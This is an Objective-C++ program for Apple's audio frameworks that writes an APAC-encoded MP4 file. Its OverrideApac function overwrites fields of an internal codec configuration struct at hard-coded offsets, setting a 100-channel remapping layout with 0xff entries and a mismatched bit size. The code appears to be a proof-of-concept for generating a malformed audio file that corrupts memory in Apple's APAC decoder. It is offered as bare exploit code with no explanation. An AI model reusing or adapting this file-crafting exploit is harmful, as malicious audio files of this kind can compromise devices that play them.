@import AVFAudio;
@import AudioToolbox;

#include <vector>

struct CodecConfig {
  char padding0[0x78];                         // 0
  AudioChannelLayout* remappingChannelLayout;  // 0x78
  char padding1[0xd8 - 0x80];                  // 0x80
  uint32_t remappingBitSize;                   // 0xd8
  char padding2[0xe0 - 0xdc];                  // 0x80
  std::vector<char> mRemappingArray;           // 0xe0
};

void OverrideApac(CodecConfig* config) {
  const int numChannels = 100;
  config->remappingChannelLayout->mChannelLayoutTag =
      kAudioChannelLayoutTag_HOA_ACN_SN3D | numChannels;
  config->remappingBitSize = (int)(log2f(numChannels) - 0.0001);
  for (int i = 0; i < numChannels; i++) {
    config->mRemappingArray.push_back(0xff);
  }
}

int main() {
  AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:44100
                                                                           channels:1];
  AudioStreamBasicDescription outputDescription{.mSampleRate = 44100,
                                                .mFormatID = kAudioFormatAPAC,
                                                .mFormatFlags = 0,
                                                .mBytesPerPacket = 0,
                                                .mFramesPerPacket = 0,
                                                .mBytesPerFrame = 0,
                                                .mChannelsPerFrame = 4,
                                                .mBitsPerChannel = 0,
                                                .mReserved = 0};
  AVAudioChannelLayout* channelLayout =
      [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 4];

  NSURL* outUrl = [NSURL fileURLWithPath:@"output.mp4"];

  OSStatus status = 0;

  ExtAudioFileRef audioFile = nullptr;
  status =
      ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileMPEG4Type, &outputDescription,
                                channelLayout.layout, kAudioFileFlags_EraseFile, &audioFile);
  if (status) {
    fprintf(stderr, "error creating file: %x\n", status);
    return 1;
  }
  float audioBuffer[44100] = {};

  status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                   sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
  if (status) {
    fprintf(stderr, "error writing audiofile: %x\n", status);
    return 1;
  }
  status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                   sizeof(AudioChannelLayout), formatIn.channelLayout.layout);
  if (status) {
    fprintf(stderr, "error writing audiofile: %x\n", status);
    return 1;
  }

  AudioBufferList audioBufferList{
      .mNumberBuffers = 1,
      .mBuffers =
          {
              {
                  .mNumberChannels = 1,
                  .mDataByteSize = sizeof(audioBuffer),
                  .mData = audioBuffer,
              },
          },
  };
  status =
      ExtAudioFileWrite(audioFile, sizeof(audioBuffer) / sizeof(audioBuffer[0]), &audioBufferList);
  if (status) {
    fprintf(stderr, "error writing audiofile: %x\n", status);
    return 1;
  }
  status = ExtAudioFileDispose(audioFile);
  if (status) {
    fprintf(stderr, "error closing audiofile: %x\n", status);
    return 1;
  }
  audioFile = nullptr;
  return 0;
}
